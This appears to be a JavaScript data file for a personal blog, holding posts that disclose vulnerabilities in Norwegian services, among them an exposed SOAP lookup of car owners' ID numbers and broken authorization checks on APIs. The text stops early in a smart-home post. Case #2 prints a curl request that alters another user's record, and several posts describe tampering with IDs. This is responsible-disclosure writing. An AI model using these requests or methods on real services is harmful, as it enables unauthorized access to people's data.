window.SpaBlog = window.SpaBlog || {}; // Our namespace

(function (SpaBlog) {
    SpaBlog.posts =
        [
            {
                "title": "Building a real SPA blog",
                "published": true,
                "publishDate": "2017-08-08T06:00:00.000Z",
                "summary": `This blog is a real single-page application with no server code or database. It\'s refreshingly easy to work with.`,
                "niceUrl": "/2017/08/building-a-real-spa-blog",
                "text": `<h4>tl;dr</h4>This blog is created with <i>Knockout</i> and <i>Materialize</i>, and have all blog posts in a single <i>JavaScript array</i>. All static.
                
<h4>Medium</h4>I wanted a blog. A plain and simple blog. More often than not I read blog posts hosted by <a href="https://medium.com/">medium.com</a>. It seems like they are really dominating these days (at least for tech blogs). And I understand why; the layout is so simple yet attractive and easy to read.
                
I expected to settle with a medium.com blog. However, it isn't possible to have ads in the blog posts. And I wanted that.

<h4>Wordpress</h4>Wordpress has ruled the world for quite a long time. <a href="https://wordpress.com">wordpress.com</a> of course costs money if you want to make any money using ads. I don't expect many dollars in income, so I'd like to avoid any fixed costs. Then there is <a href="https://wordpress.org">wordpress.org</a>, but I don't really want to host it myself and stay up to date with <a href="https://www.cvedetails.com/product/4096/Wordpress-Wordpress.html">security issues</a> and all.

<h4>Blogger</h4>I looked at Google's <a href="https://blogger.com">blogger.com</a>. Customizing the layout and templates I thought I was getting there. They have some really nice features. But I couldn't make it look and feel exactly right. And it felt cumbersome to do all the adjustments to get where I wanted.

<h4>Good old days</h4>I knew I didn't want to reinvent the wheel. If this had been somewhere from 2000 to 2007 I probably would have mashed something together using PHP and MySQL. But the thought of doing that in 2017 repelled me. I didn't want any database setup, SQLs or stuff that takes time from creating the actual product.

<h4>Cloud hosting</h4>Further on I didn't want some hosting at one of the big companies offering "free" (they tend to end up costing a few bucks) backend hosting with all the hassle of setting up a new environment and installing some SDKs that needs to be constantly updated or suddenly removes support for some version of whatever you use.

<h4>Requirements</h4>Basically I had the following requirements.
<ul><li> - High readability and ok design</li><li> - Ad support</li><li> - Simple hosting</li><li> - Easy, but advanced customization</li><li> - Quick to set up with no hassle (no database setup, easy development, no unecessary heavy build systems)</li><li> - SEO friendly</li></ul>
<h4>Solution</h4>I was wondering about using just static HTML files. That would indeed answer most of my requirements. But then I thought about having a simple JavaScript SPA.

<h5>JavaScript framework</h5>I suppose <a href="https://angular.io/">Angular 2</a> or <a href="https://facebook.github.io/react/">React</a> would be among the most logical choices of JavaScript frameworks in 2017. But I wanted productivity and not use a lot of time to learn yet another framework when all I want is a quick and simple blog, so I went for good old <a href="http://knockoutjs.com/">Knockout</a> which I have used quite a lot as earlier on as an IT consultant.

<img class="materialboxed responsive-img" title="Knockout js dead? Not the Google auto completion you want." data-caption="Knockout js dead? Not the Google auto completion you want." alt="Is Knockout JS dead?" src="/images/knockout-js_dead.png">

While one might argue that Knockout is beyond its prime time, it sure works great and it is mature. And no matter which newer JavaScript framework I would go for it would soon be considered "old". If you haven't read the article <a href="https://hackernoon.com/how-it-feels-to-learn-javascript-in-2016-d3a717dd577f">How it feels to learn JavaScript in 2016</a> by Jose Aguinaga, you really should. It's painful to read, but so true.

<h5>Design</h5>I'm no designer. So I like to use UI frameworks that ensures that I can't get it completely wrong. I really like Google's <a href="https://material.io/guidelines/">Material Design</a> and is used to using it on Android. I quickly found <a href="http://materializecss.com">Materialize</a> and haven't looked back. It has great features and is a joy to use. I just wish it didn't depend on jQuery.

<h4>GitHub project</h4>If you're interested you can have a look at the source code for this blog at <a href="https://github.com/roys/js-web-blog">https://github.com/roys/js-web-blog</a>. The project itself is licenced under the MIT License, but for the contents (posts and images) I reserve all rights.
`,
                "images": ["/images/knockout-js_dead.png"],
                "category":
                {
                    "title": "Software development",
                    "url": "/software-development"
                },
                "tags": [
                    {
                        "title": "JavaScript",
                        "url": "/javascript"
                    },
                    {
                        "title": "SPA",
                        "url": "/spa"
                    }
                ],
                "commentsIdentifier": "http://blog.roysolberg.com/2017/08/get-your-ssn-here"
            },
            {
                "title": "Security vulnerability disclosures",
                "published": true,
                "publishDate": "2017-08-09T21:00:00.000Z",
                "summary": `I\'m preparing a series of posts where I\'m disclosing several security vulnerabilities that I discovered the spring and summer of 2017.`,
                "niceUrl": "/2017/08/security-vulnerability-disclosures",
                "text": `<h4>tl;dr</h4>Over the years I've discovered so many security holes and information leaks on the Internet. Earlier I've only notified the involved parties, but I think it's time to go public doing "responsible disclosure".
                
<h4>The purpose</h4>Working with preparing these posts I've asked myself repeatedly if I should go public with my findings or not.

I'm still not entirely sure what the right answer is. What I do know is that <b>I want increased focus on web security</b> and that I feel a <a href="https://en.wikipedia.org/wiki/Social_responsibility">social responsibility</a> to do so.

The purpose of posting these vulnerabilities is fivefold:
 - Make people aware that close to all their personal information is already in the hands of anyone who wants it.
 - I want computer security to be a (bigger) part of the IT education and training.
 - I want computer security to be a natural part of any developer's mindset.
 - I want businesses to know that there might be consequences of being sloppy with people's data.
 - Make your and my own data more safe.

<b>Hopefully the issues presented on this site can be a small part of getting some kind of discussion on how to deal with computer security and personal data.</b>

<h4>What I have done</h4>While looking for security vulnerabilities I have followed a few simple rules.

<h5>What I have done:</h5> - Only looked at webapps (frontends and APIs) and mobile apps
 - Only looked at Norwegian services (though some are internationally available)
 - Immediately reported any security concerns and given reasonably time to fix any problems
 - Only spent minutes until I found some security hole or information leak

<h5>What I have not done:</h5> - Not hid my identity:
   - I have worked from my home IP
   - When logged in I have used my own personal account
   - I have not tried to fly under the radar in regards of staying out of logs etc.
 - Not looked for or used security holes in operating systems, app servers, networking equipment, etc.
 - Not interferred with the operation of the webapps or companies
 - Not altered or deleted any data
 - Not stored any personal data or even tried accessing anything beyond proving the weakness

<h4>Information sensitivity</h4>The levels of the sensitivity in the information leaks I found vary. They go all the way from <i>"Nah, I dont really care"</i> to <i>"0hly shit, this is not cool"</i>. But I think they all represent some unique points in respect of vulnerabilities and in respect of type of personal information.

<h4>Reponsible disclosure</h4>I'm all for <a href="https://en.wikipedia.org/wiki/Responsible_disclosure">responsible disclosure</a> and have immediately reported my findings. Generally I'm not publishing any details the problem has been confirmed fixed. However, sadly, in some cases there's just no interest or response from the other party.

If you want more thoughts about responsible disclosure I would recommand reading <a href="https://www.troyhunt.com/kids-pass-just-reminded-us-how-hard-responsible-disclosure-is/">Troy Hunt's site</a> (and maybe especially the video in that link).
`,
                "category":
                {
                    "title": "Security",
                    "url": "/security"
                },
                "tags": [
                    {
                        "title": "Background article",
                        "url": "/background"
                    }
                ]
            },
            {
                "title": `Case #1: Get your Social Security numbers here!`,
                "published": true,
                "publishDate": "2017-08-14T05:30:00.000Z",
                "updateDate": "2017-08-17T16:50:00.000Z",
                "summary": `Using only the plate number of a Norwegian car you can find the name, address, Social Security number, etc. of the owners.`,
                "niceUrl": "/2017/08/get-your-ssn-here",
                "text": `<h4>tl;dr</h4>While <a href="https://en.wikipedia.org/wiki/National_identification_number#Norway">Norway's version of the Social Security number (SSN)</a> isn't considered sensitive personal information, it can still be used for ID theft and is sometimes treated as an authenticator and not only used for indentification. Knowing (or systematically picking) a car's number plate you can get quite a bit of personal information about the owners. Also, services hosted alongside the one in question seem to have dubious security.

<h4>Summary</h4><table class="summary">
    <tr>
        <td style="width:30%">Who:</td>
        <td>Tryg's mobile app and Infotorg's web services</td>
    </tr>
    <tr>
        <td style="width:30%">Severity level:</td>
        <td><span class="green-text">Low</span> to <span class="orange-text">medium</span></td>
    </tr>
    <tr>
        <td style="width:30%">Reported:</td>
        <td>February 2017</td>
    </tr>
    <tr>
        <td style="width:30%">Reception and handling:</td>
        <td><span class="red-text">Very poor</span></td>
    </tr>
    <tr>
        <td style="width:30%">Status:</td>
        <td><span class="red-text"><strike>Not fixed</strike></span> <span class="green-text">Fixed after this post was published</span></td>
    </tr>
    <tr>
        <td style="width:30%">Issue:</td>
        <td>A lot of personal info available for anyone who wants it</td>
    </tr>
</table>
<div style="padding-top:80px;" class="col s12 m5 l5 xl4 right"><div class="card-panel light-blue darken-1"><span style="text-decoration:underline;" class="white-text"><a class="white-text" href="/2017/08/security-vulnerability-disclosures">Background: The purpose of these posts</a></span></div></div>
<h4>Background</h4><img style="float:left;width:240px;margin-right:20px;" class="materialboxed responsive-img" title="Screenshot from Tryg's app Trygg på reise." data-caption="Screenshot from Tryg's app Trygg på reise." src="/images/tryg-trygg_paa_reise.png"/>The way to get the name (typically to look up the phone number to make contact) of a car owner in Norway has typically been to just send an SMS that costs some cents. A friend and former colleague told me about the insurance company Tryg's app <a href="https://play.google.com/store/apps/details?id=com.no.tryg&hl=en">Trygg på reise (Safe travel)</a> where you can look up this information for free (plus Google broke their SMS app Hangouts making it impossible to send SMSes to 4 digit phone numbers). I had used it for quite a long time when one day I was curious about where it got its data from, if it maybe was possible to create some services on top of that data.

<h4>Approach (technical stuff)</h4><h5>HTTP proxy</h5>If you want to intercept traffic between a server and a mobile app (even SSL), the HTTP proxy <a href="https://www.charlesproxy.com/">Charles</a> (and Android 6 or below for SSL) is the <b>the</b> way to go. It's very easy to use and gives a very good overview of the data going back and forth. And it let's you easily copy the HTTP requests as <a href="https://curl.haxx.se/">Curl</a> commands.

Within a couple of minutes you have a pretty decent control of the HTTP calls for that app.

<h5>Web Service endpoint</h5>The first surprise I got was that the app and server actually use the procotol <a href="https://en.wikipedia.org/wiki/SOAP">SOAP</a> which is just terrible to work with. (I suspect people having to use, develop and debug SOAP services live in a fog of <a href="http://www.urbandictionary.com/define.php?term=FML#1256378">#FML</a>.)
<!--img style="width:300px;float:left;margin-right:20px;" class="materialboxed responsive-img" title="We can finally get all the details about the real-life replica of Il Tempo Gigante. Picture by Curt (https://www.flickr.com/photos/curt-dk/ / CC BY-NC 2.0)" data-caption="We can finally get all the details about the real-life replica of Il Tempo Gigante. Picture by Curt (https://www.flickr.com/photos/curt-dk/ / CC BY-NC 2.0)" src="/images/il_tempo_gigante.jpg"/-->
<img style="width:300px;float:left;margin-right:20px;" class="materialboxed responsive-img" title="Some of the data about the real-life replica of Il Tempo Gigante returned by the web service." data-caption="Some of the data about the real-life replica of Il Tempo Gigante returned by the web service." src="/images/il_tempo_gigante_ws.png"/>The second surprise was that the web service actually sent back much more info than what it display in the user interface in the app, and not only the municipality that you also get with the amentioned SMS service. I've summarized all the details further down after all the technical details here. <b>But seeing both the owner and co-owner's SSNs and addresses surprised me the most.</b>

I noticed that the web service call always included the username and password instead of the returned session id. No biggie, but a bit strange. <b>The strings for usernames and password were all upper case and only 6-7 characters long. The password was almost the same as the username and all of them containing the name of the customer and the abbreviation of the service name. I hope that isn't the standard, that it gives me a clue on how the logins for the other services are.</b>

<img class="materialboxed responsive-img" title="Curl version of the HTTP request from the Tryg app." data-caption="Curl version of the HTTP request from the Tryg app." src="/images/curl_infotorg.png"/>
<h4>Security issue?</h4>The data returned is returned as intended, so there's so information leak in itself. The web service works as it should. However, <b>it's more questionable if it's okay that a service like to be facing a public client</b>.

The data returned from the service is as follows:
 - The owner's first, middle and last name (alt. company name)
 - The owner's full address
 - The owner's Social Security number (org.no. if company)
 - The owner's birthday (as it's part of the SSN in Norway)
 - Any co-owner's first, middle and last name
 - Any co-owner's full address
 - Any co-owner's Social Security number
 - The co-owner's birthday (as it's part of the SSN in Norway)
 - A lot of technical data about the vehicle
 - The insurance company and date of the vehicle insurance
 - The insurance company and dates of the previous vehicle insurance
 - The name of the previous owner
 - Info if and when the vehicle was stolen

<b>Is this okay?</b> All the app does is show the name of the owner and details about the vehicle itself.

Apparently the name of the co-owner and previous owner is public information according to the law called <a href="https://lovdata.no/dokument/NL/lov/2006-05-19-16">Offentlighetsloven (Freedom of information act)</a> (Norwegian link only).

<h4>But wait, could there be more?</h4><a href="https://www.infotorg.no/alle-tjenester">Infotorg provides quite a few services.</a> (Norwegian link only, sorry.) Having the URL for the web service I of course checked out what else was on the server. I was a bit surprised to see that the root site had a seemingly complete list of all the services available at Infotorg. There were links to the documentation and WSDLs (Web Services Description Language) telling about all these services available and how to connect to them and use them. And these services do indeed contain much more sensitive information. There is a national population register, financial information, credit assement, employee register, lay judge register, etc. etc. <b>It's important to note that I never had (or tried to get) access to these other services. My point is that the openess is a bit too much, and seemingly the user credentials policy isn't very strict. But this is just speculation.</b>

To add to the eerie feeling about these services there are links to some test site and test CMS and information about a test client. Google has of course indexed all these other sites and sub domains. Also there are pages giving errors that gives more information about infrastructure and services running.

<h4>Reception and handling</h4><h5>Day zero</h5>I sent an e-mail to the contact e-mail address provided by Tryg at the app's Play Store page. <b>I never got an answer.</b>

I also used a web form to get in touch with Infotorg.

<h5>Day 1 - X</h5>I got an answer from Infotorg in less than 24 hours. That's prompt, that's good. And they wanted more details.

When I provided more details with an example Curl command for them to try I got an automatic e-mail back telling that the person handling this was unavailable. <b>I never heard back after that</b>, so I tried again one month later and this time including a e-mail address from the automatic e-mail that was supposed to be used for urgent cases. <b>I never heard back.</b> So I tried again writing both e-mails again five days before publishing this. <b>I never heard back.</b>

<h5>Day 186</h5>I'm publishing this post. So is this responsible disclosure? Yes, I tried hard to get an answer. But on the other hand, it seems to me that the involved parties don't think that this is a disclosure to begin with, and that it isn't a problem.

<div style="background-color:#ffecb3;padding:10px 10px 15px 10px;" class=""><h4 id="udpate">Update</h4><h5>Day 187 - Tuesday - post publish day 1</h5>Tryg's user at Infotorg's service got closed (as far as I understand, after Tryg contacted Infotorg).

<h5>Day 188 - Wednesday - post publish day 2</h5>Tryg reached out to me. They thanked for the help finding the issue, said they were sorry for it being there in the first place, and told me it had been resolved.

<h5>Day 189 - Thursday - post publish day 3</h5>digi.no published the article <i><a href="https://www.digi.no/artikler/norsk-mobilapp-apnet-for-tapping-av-masse-informasjon-om-norske-bileiere/400386">Norsk mobilapp åpnet for tapping av masse informasjon om norske bileiere</a></i>.

Tryg <a href="#comment-3472389318">commented on this post</a> here themselves.

<b>I think Tryg has - when the information finally reached them - has handled the case very well. They reacted promptly, fixed the problem, and has been very open and honest about everything. I'm really happy with that.</b>
</div>

<h4>Some fun facts</h4><h5>Fun fact #1: The previous King of Norway had his cars registered on him personally</h5><a href="https://no.wikipedia.org/wiki/Kongelige_biler_i_Norge">His Majesty The King has got a few cars</a>. Looking up e.g. the one with licence plate <i>A-1</i> you'll see that now the car is registered with <i>The Royal Court</i>, but it used to be registered directly on our previous King - <a href="https://en.wikipedia.org/wiki/Olav_V_of_Norway">Olav V</a>. They have also trusted the insurance company <a href="https://if.no">If</a> since 1995.

<h5>Fun fact #2: The service also works for Norway's new personal licence plates</h5>The summer 2017 Norwegian Public Roads Administration opened for paying to get your own personal licence plate. It's been quite a few news articles about people getting different funny and fascinating plates. The web service in question works for those as well. Maybe something to think about before sticking your head out there.

<h5>Fun fact #3: Exposed by one single post</h5>Reporting this issue I got a question back for more details. There's no better way to understand a security issue than seeing your own data. The person who responded had got this fully closed private Facebook profile. Or, did he? Well, he had <b>one single public post; a check-in</b>. The check-in was from when he got a free car wash from a big radio show in Norway. In that post there was a picture of the car in the car wash. So he got a pretty low profile on the Internet, but still one could look up the name, address, SSN, etc. Doesn't that hurt just a little bit?

<h4>Conclusion</h4><b>We should probably not fear for our SSN. But I'm still not sure if I like the idea that just based on a licence plate anyone should get your full address or know any details about your insurances.

Further I hope all of Infotorg's more sensitive services are much more secure than first impression I got; that they are alerted if anyone tries any brute force attacks or systematic information gathering, and that the logins don't consist of only a few capital letters.

Also, I wish that it wasn't so hard to get the attention when trying to report a security concern...</b>

<h4>At last some - hopefully - far fetched ideas</h4>I call this "far fetched", because it's hard to believe it would happen, but I can't help thinking it.

We know from media the later years that governments from different countries do collect quite a bit of intelligence and information about people. Wouldn't be interesting for some states to get a catalogue of a big part of Norway's population? I mean, they get a real one-to-one identifier and full names and quite a bit of meta information. Combining this information over time with information from other sources? Observering a dataset like discussed here over time, one can get a sense of family relations, split-ups, address changes, income changes, etc. Is that okay? What if you at some point shared an address with a person that has got an entry ban in a country you want to travel to? Should they stop you too just to be sure?

What about insurance companies? They could in theory use the dataset to target potential customers. If they know that they beat the prices of one other particular insurance company they could make contact and try to sell their product instead. But then again, they have probably always had full access to these data.

If you use your imagination I'm sure you can come up with other ways to (ab)use the data.
`,
                "images": ["/images/il_tempo_gigante_ws.png", "/images/tryg-trygg_paa_reise.png", "/images/curl_infotorg.png"],
                "links": [
                    {
                        "title": "Background: Purpose of these posts",
                        "url": "/2017/08/security-vulnerability-disclosures"
                    }
                ],
                "category":
                {
                    "title": "Security",
                    "url": "/security"
                },
                "tags": [
                    {
                        "title": "Security Monday",
                        "url": "/security-monday"
                    },
                    {
                        "title": "Information leak",
                        "url": "/information-leak"
                    },
                    {
                        "title": "Social Security numbers",
                        "url": "/ssn"
                    },
                    {
                        "title": "OWASP 2013 A2",
                        "url": "/owasp-2013-a2"
                    },
                    {
                        "title": "OWASP 2013 A6",
                        "url": "/owasp-2013-a6"
                    }
                ],
                "commentsIdentifier": "http://blog.roysolberg.com/2017/08/get-your-ssn-here"
            },
            {
                "title": `Case #2: Good authentication, but lacking authorization`,
                "published": true,
                "publishDate": "2017-08-21T07:00:00.000Z",
                "summary": `That a service is heavily gated doesn't mean that your information is safe. I'm taking it down a notch this week; this is not a severe case, but an OK reminder for us developers on how we protect our resources and to never trust the client.`,
                "niceUrl": "/2017/08/auth-auth",
                "text": `<h4>tl;dr</h4>The service uses the industry de facto standard for high security in Norway - <a href="https://bankid.no">BankID</a> - for authentication, but still missed authorization check on a HTTP PUT call. A classical weakness to be found in web apps of today.
                
<h4>Summary</h4><table class="summary">
<tr>
    <td style="width:30%">Who:</td>
    <td>Anonymous, let's call them <a href="https://en.wikipedia.org/wiki/Fictional_company">Acme</a></td>
</tr>
<tr>
    <td style="width:30%">Severity level:</td>
    <td><span class="green-text">Very low</span></td>
</tr>
<tr>
    <td style="width:30%">Reported:</td>
    <td>March 2017</td>
</tr>
<tr>
    <td style="width:30%">Reception and handling:</td>
    <td><span class="green-text">Very good</span></td>
</tr>
<tr>
    <td style="width:30%">Status:</td>
    <td><span class="green-text">Fixed</span></td>
</tr>
<tr>
    <td style="width:30%">Reward:</td>
    <td>1 x <a href="https://www.norsk-tipping.no/flax">Flax scratch ticket</a> (≈3 USD (1:600,000 chance to win 125,000.- USD (but no, I didn't win anything)))</td>
</tr>
<tr>
    <td style="width:30%">Issue:</td>
    <td>Missing authorization on REST endpoint + still authenticated after browser timing out session</td>
</tr>
</table>
<div style="padding-top:80px;" class="col s12 m5 l5 xl4 right"><div class="card-panel light-blue darken-1"><span style="text-decoration:underline;" class="white-text"><a class="white-text" href="/2017/08/security-vulnerability-disclosures">Background: The purpose of these posts</a></span></div></div>
<h4>Background</h4>Acme is a "service booklet" for your home. It's a place to store all of the documentation about who's done what and your proof that all is ok if you were to sell your home. Everything about my house is stored at their servers.

I got a "snap" of 5 scratch tickets from a friend that he got from Acme for reporting some problem with him getting the wrong house number. I thought maybe there could be an easy way for me to get some scratch tickets as well.

<h4>Approach (technical stuff)</h4>This was a quick one I did while grabbing some lunch one Saturday.

<h5>Browser developer tools</h5>I logged in to Acme using BankID and having <a href="https://developers.google.com/web/tools/chrome-devtools/">Chrome DevTools</a> open. I surfed back and forth and got an impression of the webapp and got a list of URLs that was being called + headers and cookies and whatnot.

As with most webapps today there were a lot of Ajax calls going on, transfering JSON. I then tried replacing some IDs in URLs. In general stuff seemed pretty good. The security seemed to be in place.

Then I saw this sort of "task list" where you have these set tasks - and can create new ones - for stuff you need to do with your home. You can also share them with third parties so they can do them for your and sign of on the work done. Once finished can set the task to status <i>Done</i>.

<h5>Curl</h5>Most developer tools for browsers let you copy any HTTP request as a <a href="https://curl.haxx.se/">Curl</a> command. <b>I got an ID of one of the tasks of my friend and his approval to change the status of it.</b>

I've changed URLs and IDs, but otherwise it was this command used:<pre class="prettyprint">
curl 'https://example.com/UpdateTask' \\
    -H 'Cookie: &lt;some cookies for BankID, session and Google Analytics&gt;' \\
    -H 'Origin: https://example.com' \\
    -H 'Accept-Encoding: gzip, deflate, br' \\
    -H 'Accept-Language: nb-NO,nb;q=0.8,no;q=0.6,nn;q=0.4,en-US;q=0.2,en;q=0.2' \\
    -H 'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.98 Safari/537.36' \\
    -H 'Content-Type: application/json;charset=UTF-8' \\
    -H 'Accept: application/json, text/plain, */*' \\
    -H 'Referer: https://example.com/app/index.html' \\
    -H 'X-Requested-With: XMLHttpRequest' \\
    -H 'Connection: keep-alive'  \\
    --data-binary '{"taskId":&lt;some other person\’s task ID&gt;,"status":true}' \\
    --compressed</pre>
<b>And bingo, the server returned HTTP 200 and the task was changed.</b>

<h5>Session management</h5>Returning to my computer some time after doing this, the browser told me I got logged out because of the session being timed out. I tried one of the Curl commands one more time and saw that the HTTP request went through and returned HTTP 200. <b>Appearantly I was still logged in and had a valid session even though my browser told me otherwise.</b>

<h4>Classical issue</h4><b>I think this is one of the more common issues in web apps today. When authorization of GETting data is in place, one have a tendency not to check if the client is allowed to do what he's telling the server when PUTting data back.</b>

<h4>Reception and handling</h4><h5>Day zero</h5>I sent an e-mail telling about the two minor issues.

<h5>Day 2 - before noon</h5>I got a long and well-written reply thanking me for finding the issue and telling that the developers were looking at it. They also went on telling that they were growing and there was a new employee coming in who would have the service's security as its responsiblity.

<h5>Day 2 - night</h5>I got an update. <b>They had found the authorization issue and were in the process of fixing it.</b> In regards of the session still being valid they said it was just that the sever had one hour session timeout while the JavaScript app had it set to 20 minutes.

<h4>Anonymous you say?</h4><b>I contacted Acme telling them that I was posting this. Until then they were very professional and open, but suddenly they became a bit defensive.</b> And they wanted to "inform me" that I had broken their terms the moment I had checked if they had any security holes. They did not want me to mention their company name or brand. They were afraid of the media. I can fully understand that. Who doesn't want to protect their brand?

<b>I think they have handled the situation so well, and the issue was so minor, that I want to encourage them to come forward.</b>

<h4>Conclusion</h4>This was a minor issue, but an issue I see quite a bit. The reception and handling was good, at least until I told I was publishing this. Developers: Go and check those POST and PUT requests and double check that you verify if the client is allowed to do what it wants to.
`,
                "links": [
                    {
                        "title": "Background: Purpose of these posts",
                        "url": "/2017/08/security-vulnerability-disclosures"
                    }
                ],
                "category":
                {
                    "title": "Security",
                    "url": "/security"
                },
                "tags": [
                    {
                        "title": "Security Monday",
                        "url": "/security-monday"
                    },
                    {
                        "title": "Authorization",
                        "url": "/authorization"
                    },
                    {
                        "title": "Session handling",
                        "url": "/session-handling"
                    },
                    {
                        "title": "OWASP 2013 A2",
                        "url": "/owasp-2013-a2"
                    },
                    {
                        "title": "OWASP 2013 A7",
                        "url": "/owasp-2013-a7"
                    }
                ],
                "commentsIdentifier": "http://blog.roysolberg.com/2017/08/auth-auth"
            },
            {
                "title": `Case #3: Who's got your IP address today?`,
                "published": true,
                "publishDate": "2017-08-28T04:45:00.000Z",
                "summary": `One of the "digital mailbox" services used by more than 400 central and local Norwegian government agencies to send mail, was leaking IP addresses and full names.`,
                "niceUrl": "/2017/08/digipost-leak",
                "text": `<h4>tl;dr</h4><i>Digipost</i> - one of two "digital mailboxes" in Norway where you can get mail from public authorities - leaked users' full real name, IP addresses and login timestamps.
                
<h4>Summary</h4><table class="summary">
<tr>
    <td style="width:30%">Who:</td>
    <td><a href="https://www.posten.no/en/">Norwegian postal service's</a> <a href="https://www.digipost.no/">Digipost</a></td>
</tr>
<tr>
    <td style="width:30%">Severity level:</td>
    <td><span class="orange-text">Medium</span></td>
</tr>
<tr>
    <td style="width:30%">Reported:</td>
    <td>May 2017</td>
</tr>
<tr>
    <td style="width:30%">Reception and handling:</td>
    <td><span class="green-text">Very good</span></td>
</tr>
<tr>
    <td style="width:30%">Status:</td>
    <td><span class="green-text">Fixed</span></td>
</tr>
<tr>
    <td style="width:30%">Reward:</td>
    <td>125 USD worth of gift certificates</td>
</tr>
<tr>
    <td style="width:30%">Issue:</td>
    <td>Information leak with users' name and IP address</td>
</tr>
</table>
<div style="padding-top:80px;" class="col s12 m5 l5 xl4 right"><div class="card-panel light-blue darken-1"><span style="text-decoration:underline;" class="white-text"><a class="white-text" href="/2017/08/security-vulnerability-disclosures">Background: The purpose of these posts</a></span></div></div>
<h4>Background</h4>In Norway we have two official suppliers for a "digital mailbox" where Norwegian public agencies can send you letters and documents. It's considered a more secure way than regular mail for delievering important letters and documents. The mailboxes have been pushed pretty hard the last couple of years, ensuring that as many as possible will sign up for it.

I've personally used Digipost for quite a few years now. I think it's a great service for receiving important documents. One day I was wondering if my information and documents were safe with them.

<h4>Approach (technical stuff)</h4><h5>HATEOAS</h5>Earlier on I used to attend the very good Java conference <a href="https://javazone.no/">JavaZone</a> every year. Five years ago I was at a talk from a couple of consultants working with Digipost, called <a href="https://vimeo.com/49392437">Hypermediadrevet API i praksis</a> (Hypermedia driven API in practice). It was an inspiring talk which made me make at least the next REST API hypermedia driven.

Little did I know that I would use this "Hypermedia as the Engine of Application State" (HATEOAS) to an advantage when looking for security issues at the same site years later. Simply explained, the HATEOAS makes REST APIs more self-documenting and easier to browse through using the links provided.

<h5>Browser developer tools</h5><img style="width:500px;float:left;margin-right:20px;" class="materialboxed responsive-img" title="Wait a minute, those aren't my logins? Screenshot from Chrome containing JSON with login history." data-caption="Wait a minute, those aren't my logins? Screenshot from Chrome containing JSON with login history." src="/images/digipost_eventlogs.png"/>I logged in to Digipost having <a href="https://developers.google.com/web/tools/chrome-devtools/">Chrome DevTools</a> open to see what was going on. I opened one or more of the REST URLs in a different tab. Having a JSON viewer browser extension like <a href="https://chrome.google.com/webstore/detail/json-formatter/bcjindcccaagfpapjjmafapmmgkkhgoa">JSON Formatter</a> (that hopefully doesn't ship everything it sees to a third party server) makes looking at JSON a pleasure. The API being hypermedia driven meant that you get instant linkification and can browse through the data quickly.

Digipost seemingly uses an auto increment integer as ID for the user, making it easy to check if your data is secured against the access of others. (Remind me to write a post about the pros and cons against IDs like that (and no, security by obscurity does not make your data safe)). I changed a few IDs here and there and mostly got different kinds of error messages thrown back at me. <b>However, I quickly found two URLs that didn't seem to have a proper authorization check.</b>

<h4>Security issue</h4>Two URLs without proper authorization checks was found.

The first URL apparently returned the number of unpaid invoices you have. Not something you would care about if someone accessed.

<b>The second one was the alarming one for me. It returned the account activities for the past 30 days.</b> The data had the following elements:
- Date of activity
- <b>Full name</b> of the person performing the activity
- Type of activity (e.g. level of authorization and authentication method)
- <b>IP address</b> of client
- The role of the person

<h4>What's the big deal about this?</h4>The information exposed isn't sensitive, so why should you care? Well, I think there are two important points here.

<b>The first point is that a service like this - promoted and pushed by the government - should have zero tolerance on any kind of information leak.</b> As system developers we make mistakes all the time. Every week we go to work and create new bugs. Hopefully they aren't security related, but sometimes they are. When working with services like this it's so incredibly important to have proper methods and routines to minimize the chance that this can't happen.

<b>The second point is that I think the combination of a full real name and a fresh IP address is unfortunate.</b> It doesn't really matter for me, and probably not for you, but what about public figures or persons with unlisted addresses?

<h4>Reception and handling</h4><h5>Day zero</h5>At night I sent an e-mail to the customer service.

<h5>Day 2</h5>Less than 48 hours afterwards I got an e-mail apologizing that I didn't receive an answer before and telling that they had fixed the issue and were going to deploy it the same day.

<h5>Day X</h5>I received a reward of some gift cards which I appreciated, but what might've impressed me the most was that the chief of security actually took the time to add hand written thank you note.

<b>I think the issue in question was handled very well. Digipost responded quickly, fixed it quickly, and communicated in a clear and professional way. Even when reaching out telling about this post they responded in the same manner.</b>

<h4>Conclusion</h4><b>It's important to underline that I never got access to any documents, communication or any information regarded as sensitive.</b> But for me this is a type of service that should have the same level of security as a bank. There just shouldn't be any information leaks. I truly believe that the information leaked could've be used for bad purposes.
`,
                "images": ["/images/digipost_eventlogs.png"],
                "links": [
                    {
                        "title": "Background: Purpose of these posts",
                        "url": "/2017/08/security-vulnerability-disclosures"
                    }
                ],
                "category":
                {
                    "title": "Security",
                    "url": "/security"
                },
                "tags": [
                    {
                        "title": "Security Monday",
                        "url": "/security-monday"
                    },
                    {
                        "title": "Information leak",
                        "url": "/information-leak"
                    },
                    {
                        "title": "Authorization",
                        "url": "/authorization"
                    },
                    {
                        "title": "OWASP 2013 A7",
                        "url": "/owasp-2013-a7"
                    }
                ],
                "commentsIdentifier": "http://blog.roysolberg.com/2017/08/digipost-leak"
            },
            {
                "title": `My dumb smart home`,
                "published": true,
                "publishDate": "2017-08-31T05:15:00.000Z",
                "summary": `My smart home isn't all smart. When it comes to security it's pretty dumb.`,
                "niceUrl": "/2017/08/my-dumb-smart-home",
                "text": `<div style="background-color:#ffecb3;padding:10px 10px 10px 10px;">This post was originally <a href="https://plus.google.com/+RoySolberg/posts/gNt4paU7KEZ">published on Google+</a> September 2015.</div>
<h4>tl;dr</h4>It isn't that the home automation system <a href="http://www.hdlautomation.com/">HDL-BUS Pro</a> has any security holes; it doesn't have any security. If your house, the hotel you're staying on or your business uses HDL you should definitely read on.
                
<h4>Intro</h4>This spring I moved into my new house. When building a house in 2014/2015 you kind of feel obligated to make it a bit smart. Being a programmer it makes it a must. I looked into quite a few systems and protocols for home automation. Since this is a new building I preferred a cabled system instead of a wireless one. The electrical contractor for the house wasn't much updated on smart homes, but luckily they had a few electricians which knew and installs HDL-BUS Pro systems. So a bit coincidentally I ended up with HDL.

Long before the actual installation I went to a training for "programming" (configuring really) the system. I was very curious about the underlying protocol and how stuff worked under the hood. Luckily HDL is open about its buspro protocol - and that's a healthy sign - and I learned about and was given the specification for the internal communication between the components. This was when I first was a bit surprised about the lack of security. <b>It's a straight forward simple protocol - and that's a good thing - but it completely lacks encryption, authentication and authorization.</b>

HDL has a component called IP gateway which is a gateway between ethernet and the wired HDL components. The IP gateway is necessary to configure the components through the Windows application called HDL-BUS Pro Setup Tool. It also supports remote configuration from anywhere on the Internet.

